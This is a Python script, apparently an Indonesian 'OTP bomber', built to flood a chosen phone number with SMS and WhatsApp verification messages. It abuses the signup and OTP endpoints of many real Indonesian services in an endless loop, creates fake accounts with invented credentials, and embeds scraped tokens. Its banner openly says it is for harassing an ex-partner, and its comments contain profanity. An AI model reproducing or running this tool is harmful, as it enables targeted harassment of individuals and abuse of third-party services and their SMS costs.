import time
print ('\33[1;33mSELAMAT DATANG DI SCRIPT SPAM CHAT WAHTSAPP!!!')

time.sleep(2.5)

print ('\33[1;33mSCRIPT INI TIDAK UNTUK DIPERJUAL BELIKAN')

time.sleep(2.5)

print ('\33[1;33/SELAMAT MEMAKAI SCRIPT SAYA')

time.sleep(2.5)

print ('\33[1;33mGUNAKAN UNTUK MENYEPAM MANTAN')

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')

import re, sys, os, json, requests, random, time, rich
from rich import print as cetak
from rich.panel import Panel as nel
from time import sleep

#-----------[ INI-WARNA-NGENTOD ]---------#

m = "\033[1;31m"
h = "\033[1;32m"
k = "\033[1;33m"
b = "\033[1;36m"
u = "\033[1;35m"
x = "\033[1;37m"
i = "\033[1;30m"
#------------------------>>>>>>
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
cyan = "\033[1;36m"
purple = "\033[1;35m"
white = "\033[1;37m"
black = "\033[1;30m"

#-------------[ SYSTEM-DEV ]------------#

if "linux" in sys.platform.lower():
	os.system(
			"clear"
	)
elif "win" in sys.platform.lower():
	os.system(
			"cls"
	)

elif "win" in sys.platform.lower():
	os.system(
			"cls"
	)
else:
	os.system(
			"clear"
	)

#------------------[ SYSTEM-SUPPORT ]-----------------#

try:
	ip = requests.get(
				"https://api.ipify.org"
		).text
except requests.exceptions.ConnectionError:
	exit(f"\n  {red}! {white}Koneksi Internet Error\n")

agent = random.choice(
			[
				"Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
				"Dalvik/1.6.0 (Linux; U; Android 4.1.1; BroadSign Xpress 1.0.14 B- (720) Build/JRO03H)",
				"Mozilla/5.0 (Linux; U; Android 4.1.1; en-us; BroadSign Xpress 1.0.15-6 B- (720) Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30","Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
				"Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
				"Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
		]
	)
#-----------------[ INI-LOGO-KONTOL ]---------------#
def logo():
	banner = f"[white][[yellow]•[white]] Status	[red]:[green] Online\n[white][[yellow]•[white]] IP		[red]:[green] 111.121.34.567[white] "
	cetak(nel(banner, style='cyan', title='[blue]Informasi[white]'))
	banner2 = f"[white][[cyan]01[white]]. Bot Spaming\n[[cyan]02[white]]. Bot Unfriend\n[[cyan]03[white]]. Keluar ([yellow] out[white] )"
	cetak(nel(banner2, style='cyan'))

#-------------------[ SYSTEM-AUTOMATIC ]-------------#

def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)

class Main:
	def __init__(self):
		self.sanz = "Hendar Official"
		self.main()

	def wait(self,free_tutorial):
		for sanz in range(free_tutorial):
			free_tutorial -= 1
			sys.stdout.write(f"\r  {red}•> {white}Please wait {green}{str(free_tutorial)} {white}sec ")
			sys.stdout.flush()
			sleep(1)

	def main(self):
		global nomor
		logo()
		sanz = input(f"  {x}[{h}?{x}] Input Pilihan : ")
		if sanz == "1" or sanz == "01":
			asuh = '[white][[green]•[white]] Disarankan Untuk Spam Mantan'
			cetak(nel(asuh, style='cyan'))
			print(f"\r  {x}[{b}•{x}] Contoh {b}: {h}+6281234xxxxxx")
			nomor = input(f"  {x}[{b}•{x}] Number {b}: {k}+62").replace("+62","")
			bi = random.choice([m,k,h,u])
			print('')
			sleep(1)
			if nomor == "":
				pass
			else:
				while True:
					sxp_sms()
					sxp_wa()
					asu = random.choice([b,u,i,x])
					jalan(f'{asu}')
					self.wait(3) # <- waktu delay
					sys.stdout.write("\r                           ");sys.stdout.write("\r")
					sleep(1)

		elif sanz == "2" or sanz == "02":
			print(f"\n     {red}! {white}Follow Instagram Aink Ngab")
			# Ganti link fb nya v
			#os.system("xdg-open https://www.instagram.com/mhff_xy")
			input(f"     {red}> {white}Press Enter to go Back ")
			print()
			os.system("python spam.py")
		elif sanz == "4" or sanz == "04":
			()
		elif sanz == "3" or sanz == "03":
			exit(f"\n     {red}! {white}Exit This Tools..\n")
		else:
			exit(f"\n     {red}! {white}Option Does Not Exist\n")
			

print()
sleep(1)
class sxp_sms:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def sms_otp_1(self, no):
		__req__ = self.req.post("https://service.mokapos.com/account/v1/verification/phone/send",
			headers = {
				  "accept": "application/json, text/plain, */*",
				  "authorization": "undefined",
				  "save-data": "on",
				  "user-agent": agent,
				  "content-type": "application/json;charset=UTF-8"
				},
			json = {
				 "phone_number": f"+62{no}"
			  }
		).text

	def sms_otp_2(self, no):
		data = json.dumps({
					"mobile": f"0{no}",
					"noise": "1583590641573155574",
					"request_time": "158359064157312",
					"access_token": "11111"
				   })
		__req__ = self.req.post("https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code",
			headers = {
				    "accept": "text/html, application/xhtml+xml, application/json, */*",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				    "content-length": "166",
				    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
				    "origin": "https://h5.rupiahcepatweb.com",
				    "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
				    "sec-fetch-dest": "empty",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-site": "same-site",
				    "user-agent": agent
				  },
			data = {
				 "data": data
			   }
		).text

	def sms_otp_3(self, no):
		__req__ = self.req.post("https://www.olx.co.id/api/auth/authenticate",
			headers = {
				    "accept": "*/*",
				    "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
				    "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
				    "user-agent": agent,
				    "content-type": "application/json"
				  },
			json = {
				 "grantType": "retry",
				 "method": "sms",
				 "phone": no,
				 "language": "id"
				}
		).text

	def sms_otp_4(self, no):
		__req__ = self.req.post("https://www.alodokter.com/login-with-phone-number",
			headers = {
				    "user-agent": agent,
				    "content-type": "application/json",
				    "referer": "https://www.alodokter.com/login-alodokter",
				    "accept": "application/json",
				    "origin": "https://www.alodokter.com"
				  },
			json = {
				 "user":{
					  "phone": f"0{no}"
					}
				}
		).text

	def sms_otp_5(self, no):
		__req__ = self.req.post("https://www.kelaspintar.id/user/otpverification",
			headers = {
				    "x-requested-with": "XMLHttpRequest",
				    "User-Agent": agent,
				    "Referer": "https://www.kelaspintar.id/"
				  },
			data = {
				 "user_mobile": no,
				 "otp_type": "send_otp_reg",
				 "mobile_code": "%2B62"
				}
		).text

	def sms_otp_6(self, no):
		aink_sanz = random.choice(
						[
							"buka blokan lah bisi riset hp maneh te sesuai perjanjian",
							"Hallo Bangsad",
							"Hallo Sayang",
							"Hallo Ripper",
							"Hallo Ngab"
						]
					)
		email = random.choice(
					[
						"nsnsmsmksksmsm@gmail.com",
						"lavon.lockman@gmail.com",
						"duane_mclaughlin38@gmail.com",
						"alfreda.lindgren@gmail.com",
						"leonardo_kuhlman@gmail.com",
						"lyric51@gmail.com",
						"devonte_littel@gmail.com",
						"newell.kuhic@gmail.com"
					]
				)
		pw = random.choice(
					[
						"mamsmms123",
						"Wadepak1037",
						"waifugw1011"
					]
				)
		birth_date = random.choice(
						[
							"13/09/1999",
							"04/02/2022",
							"05/02/2022",
							"05/02/2022",
							"06/02/2022",
							"10/02/2022"
						]
	)
		__req__ = self.req.post("https://www.matahari.com/rest/V1/thorCustomers",
			json = {
				"thor_customer":{
						"name": aink_sanz,
						"card_number": None,
						"email_address": email,
						"mobile_country_code": "+62",
						"gender_id": "1",
						"mobile_number": f"0{no}",
						"mro": "",
						"password": pw,
						"birth_date": birth_date
						}
				},
			headers = {
					"Host": "www.matahari.com",
					"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
					"origin": "https://www.matahari.com",
					"user-agent": agent,
					"content-type": "application/json",
					"accept": "*/*",
					"x-requested-with": "XMLHttpRequest",
					"referer": "https://www.matahari.com/customer/account/create/",
					"accept-encoding": "gzip, deflate, br",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}

		).text

	def sms_otp_7(self, no):
		__req__ = self.req.post("https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
			headers = {
				    "Host": "api.duniagames.co.id",
				    "content-length": "32",
				    "accept": "application/json, text/plain, */*",
				    "x-device": "cc45ed83-73bd-4a98-83e3-874e8bc11a7f",
				    "accept-language": "id",
				    "user-agent": agent,
				    "ciam-type": "FR",
				    "content-type": "application/json",
				    "origin": "https://duniagames.co.id",
				    "sec-fetch-site": "same-site",
				    "sec-fetch-mode": "cors",
				    "sec-fetch-dest": "empty",
				    "referer": "https://duniagames.co.id/",
				    "accept-encoding": "gzip, deflate, br"
				  },
			json = {
				 "phoneNumber": f"+62{no}"
				}
		).text

	def sms_otp_8(self, no):
		__req__ = self.req.post("https://harvestcakes.com/register",
			headers = {
				    "User-Agent": agent,
				    "Referer": "https://harvestcakes.com/register"
				  },
			data = {
				 "phone": f"0{no}",
				 "url": ""
				}
		).text

	def sms_otp_9(self, no):
		__req__ = self.req.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
			headers = {
				    "Host": "identity-gateway.oyorooms.com",
				    "consumer_host": "https://www.oyorooms.com",
				    "accept-language": "id",
				    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
				    "User-Agent": agent,
				    "Content-Type": "application/json",
				    "accept": "*/*",
				    "origin": "https://www.oyorooms.com",
				    "referer": "https://www.oyorooms.com/login",
				    "Accept-Encoding": "gzip, deflate, br"
				  },
			json = {
				 "phone": f"0{no}",
				 "country_code": "+62",
				 "country_iso_code": "ID",
				 "nod": "4",
				 "send_otp": "true",
				 "devise_role": "Consumer_Guest"
				}
		).text

	def sms_otp_10(self, no):
		__req__ = self.req.post("https://crp-app.stamps.co.id/api/auth/validate-mobile-number",
			json = {
				"mobile_number": f"0{no}",
				"token": "sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"
				},
			headers = {
					"Host": "crp-app.stamps.co.id",
					"content-type": "application/json; charset=utf-8",
					"content-length": "106",
					"accept-encoding": "gzip",
					"User-Agent": agent
			}
		).text

	def sms_otp_11(self, no):
		__req__ = self.req.post("https://app-api.kredito.id/client/v1/common/verify-code/send",
			headers = {
				    "LPR-TIMESTAMP": "1603281035821",
				    "Accept-Language": "id-ID",
				    "LPR-BRAND": "Kredito",
				    "LPR-PLATFORM": "android",
				    "User-Agent": agent,
				    "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
				    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Content-Length": "79"
				   },
			data = '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}' % no
		).text

	def sms_otp_12(self, no):
		__req__ = self.req.post("https://www.autofun.co.id:443/v2/captcha/sms",
			headers = {
					"Host": "www.autofun.co.id",
					"Connection": "keep-alive",
					"Content-length": "84",
					"accept": "*/*",
					"User-Agent": agent,
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"content-type": "application/json;charset=UTF-8",
					"Origin": "https://www.autofun.co.id",
					"X-Requested-With": "acr.browser.barebones",
					"Sec-Fetch-Site": "same-origin",
					"Sec-Fetch-Mode": "cors",
					"Sec-Fetch-Dest": "empty",
					"Referer": "https://www.autofun.co.id/mobil/datsun",
					"Accept-Encoding": "gzip, deflate"
				},
			json = {
					"phoneNum": f"62{no}",
					"languageCode": "id-id",
					"countryCode": "id",
					"platform": 2
			}
		).text

	def sms_otp_13(self, no):
		__req__ = self.req.post("https://api.myfave.com/api/fave/v3/auth",
			json = {
					"phone":"+62"+no
				},
			headers = {
					"Host": "api.myfave.com",
					"Connection": "keep-alive",
					"x-user-agent": "Fave-PWA/v1.0.0",
					"Origin": "https://m.myfave.com",
					"User-Agent": agent,
					"content-type": "application/json",
					"Accept": "*/*",
					"Referer": "https://m.myfave.com/jakarta/auth",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
			}
		).text

	def sms_otp_14(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					)
		angka = random.randint(
					111,
					999
				      )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				  },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"62{no}",
				 "otp_type": "sms"
				}
		).text

	def main(self):
		self.sms_otp_1(nomor)
		self.sms_otp_2(nomor)
		self.sms_otp_3(nomor)
		self.sms_otp_4(nomor)
		self.sms_otp_5(nomor)
		self.sms_otp_6(nomor)
		self.sms_otp_7(nomor)
		self.sms_otp_8(nomor)
		self.sms_otp_9(nomor)
		self.sms_otp_10(nomor)
		self.sms_otp_11(nomor)
		self.sms_otp_12(nomor)
		self.sms_otp_13(nomor)
		self.sms_otp_14(nomor)
		jalan(f'  {x}[{b}✓{x}] {h}SPAM SMS BERHASIL.....!!{x}')

class sxp_wa:

	def __init__(self):
		self.req = requests.Session()
		self.main()

	def wa_otp_1(self, no):
		nickname = random.choice(
					  [
					    "fahmi",
					    "xzc0der",
					    "bed3bah",
					    "xmanz"
					  ]
					 )
		angka = random.randint(
					111,
					999
				       )
		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
			headers = {
				    "Host": "wong.kitabisa.com",
				    "x-ktbs-platform-name": "pwa",
				    "origin": "https://account.kitabisa.com",
				    "x-ktbs-time": "1611020248",
				    "user-agent": agent,
				    "x-ktbs-api-version": "1.0.0",
				    "accept": "application/json",
				    "x-ktbs-client-name": "kanvas",
				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
				    "x-ktbs-client-version": "1.0.0",
				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
				    "version": "3.4.0",
				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "full_name": nickname+str(angka),
				 "username": f"0{no}",
				 "otp_type": "whatsapp"
				}
		).text

	def wa_otp_2(self, no):
		__req__ = self.req.get(
			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
		).text

	def wa_otp_3(self, no):
		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
			headers = {
				    "Accept": "application/json",
				    "X-APP-VERSION-NAME": "3.4.0",
				    "X-APP-VERSION-CODE": "3399",
				    "Content-Type": "application/json; charset=UTF-8",
				    "Host": "api.bukuwarung.com",
				    "Connection": "Keep-Alive",
				    "Accept-Encoding": "gzip",
				    "User-Agent": agent
				   },
			json = {
				 "action": "LOGIN_OTP",
				 "countryCode": "62",
				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
				 "method": "WA",
				 "phone": no
				}
		).text

	def wa_otp_4(self, no):
		__req__ = self.req.post("https://evermos.com/api/client/request-code",
			headers = {
				    "user-agent": agent
				  },
			data = {
				 "telephone": f"62{no}",
				 "type": 0
				}
		).text

	def wa_otp_5(self, no):
		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
			headers = {
				    "Host": "wapi.ruparupa.com",
				    "Connection": "keep-alive",
				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
				    "Accept": "application/json",
				    "Content-Type": "application/json",
				    "X-Company-Name": "odi",
				    "User-Agent": agent,
				    "user-platform": "mobile",
				    "X-Frontend-Type": "mobile",
				    "Origin": "https://m.ruparupa.com",
				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
				    "Accept-Encoding": "gzip, deflate, br",
				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				   },
			json = {
				 "phone": f"0{no}",
				 "action": "register",
				 "channel": "chat",
				 "email": "",
				 "customer_id": "0",
				 "is_resend": 0
				}
		).text

	def wa_otp_6(self, no):
		headers = {
			    "Connection": "keep-alive",
			    "Accept": "application/json, text/javascript, */*; q=0.01",
			    "Origin": "https://accounts.tokopedia.com",
			    "X-Requested-With": "XMLHttpRequest",
			    "User-Agent": agent,
			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
			    "Accept-Encoding": "gzip, deflate",
			   }
		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
		data = {
			 "otp_type": "116",
			 "msisdn": no,
			 "tk": search,
			 "email": "",
			 "original_param": "",
			 "user_id": "",
			 "signature": "",
			 "number_otp_digit": "6",
			}
		__req__ = self.req.post(
				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
	   ).text

	def main(self):
		self.wa_otp_1(nomor)
		self.wa_otp_2(nomor)
		self.wa_otp_3(nomor)
		self.wa_otp_4(nomor)
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		jalan(f'  {x}[{b}✓{x}]{h} SPAM WA BERHASIL......!!{x}')

#class sxp_call: # Spam Call 1 Otp
#ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
#dat = {"method": "CALL","countryCode": "id",}
#
#	def __init__(self):
#		self.sanz = "FREE TUTORIAL"
#		self.req = requests.Session()
#		self.main()
#
#	def call(self, no):
#		url = "https://id.jagreward.com/member/verify-mobile/"
#		ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
#		dat = {"method": "CALL","countryCode": "id",}
#	def main(self):
#		self.call(nomor)
#
if __name__ == "__main__":
	try:
		Main()
	except KeyboardInterrupt:
		exit(f"\n     {red}! {white}Ctrl + C Detected\n")
	except requests.exceptions.ConnectionError:
		exit(f"\n     {red}! {white}Internet Connection Error\n")

